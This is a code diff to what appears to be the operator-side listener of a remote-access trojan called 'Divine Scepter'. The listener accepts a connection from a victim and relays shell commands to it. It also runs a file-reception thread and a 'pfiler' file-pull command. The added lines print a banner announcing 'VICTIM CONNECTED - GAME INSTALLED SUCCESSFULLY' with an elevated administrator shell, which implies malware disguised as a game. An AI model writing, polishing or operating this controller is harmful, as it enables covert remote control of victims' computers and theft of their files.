@@ -186,17 +186,36 @@ def main():
     try:
         s_cmd.bind((HOST, PORT))
         s_cmd.listen(1)
+
+        # ANSI color codes for styling
+        GREEN = '\033[92m'
+        YELLOW = '\033[93m'
+        CYAN = '\033[96m'
+        RESET = '\033[0m'
+        BOLD = '\033[1m'
+
         print(f"[*] Divine Scepter awaiting command on port {PORT}...")
-        
+
         file_thread = threading.Thread(target=file_reception_listener, daemon=True)
         file_thread.start()
-        
+
         conn, addr = s_cmd.accept()
-        print(f"[+] Communion established with {addr[0]}:{addr[1]}")
-        
+
+        # Display green banner when victim connects
+        print("\n" + "="*70)
+        print(f"{GREEN}{BOLD}🎯 VICTIM CONNECTED - GAME INSTALLED SUCCESSFULLY 🎯{RESET}")
+        print("="*70)
+        print(f"{CYAN}[+] Connection Route:{RESET}")
+        print(f"    {YELLOW}IP Address:{RESET}  {addr[0]}")
+        print(f"    {YELLOW}Port:{RESET}        {addr[1]}")
+        print(f"    {YELLOW}Status:{RESET}      {GREEN}ACTIVE{RESET}")
+        print(f"{CYAN}[+] Shell Type:{RESET}    Administrator Command Prompt")
+        print(f"{CYAN}[+] Access Level:{RESET}  {GREEN}ELEVATED (Admin){RESET}")
+        print("="*70 + "\n")
+
         output_thread = threading.Thread(target=listen_for_output, args=(conn,), daemon=True)
         output_thread.start()
-        
+
         while True:
             command = input()
             with stdout_lock:
@@ -207,12 +226,12 @@ def main():
                 if command.strip().lower() == 'exit':
                     conn.close()
                     break
-                
+
                 conn.sendall(command.encode('utf-8') + b'\r\n')
-                
+
                 if command.strip().lower().startswith('pfiler'):
-                    print("[+] 'pfiler' command sent. A secure conduit will be established.")
-                
+                    print(f"{CYAN}[+] 'pfiler' command sent. A secure conduit will be established.{RESET}")
+
                 time.sleep(0.1)
 
     except Exception as e:
